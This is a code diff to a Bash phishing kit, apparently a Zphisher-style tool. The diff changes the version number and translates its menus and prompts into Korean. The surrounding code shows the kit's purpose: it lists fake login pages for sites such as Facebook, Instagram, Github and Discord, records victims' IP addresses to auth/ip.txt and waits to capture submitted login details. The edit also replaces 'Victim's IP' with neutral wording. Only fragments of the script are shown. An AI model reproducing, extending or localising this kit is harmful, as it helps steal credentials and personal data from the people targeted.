@@ -90,7 +90,7 @@
 ##   TheLinuxChoice - https://twitter.com/linux_choice
 
 
-__version__="2.3.5"
+__version__="5.2.3"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
@@ -363,11 +363,11 @@ about() {
 		${GREEN}  
 		       우성재
 
-		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
+		${RED}[${WHITE}00${RED}]${ORANGE} 메인 메뉴     ${RED}[${WHITE}99${RED}]${ORANGE} 나가기
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} 사용하실 사이트 번호 : ${BLUE}"
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -412,7 +412,7 @@ setup_site() {
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} 아이피 상태 : ${BLUE}$IP"
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
@@ -434,7 +434,7 @@ capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} 아이피를 찾았습니다 !"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
@@ -736,7 +736,7 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} 어떤 사이트를 활용할 건가요 ${RED}[${WHITE}::${RED}]${ORANGE}
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
 		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
@@ -751,7 +751,7 @@ main_menu() {
 		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${RED}[${WHITE}99${RED}]${ORANGE} 더보기         ${RED}[${WHITE}00${RED}]${ORANGE} 나가기
 
 	EOF
 	
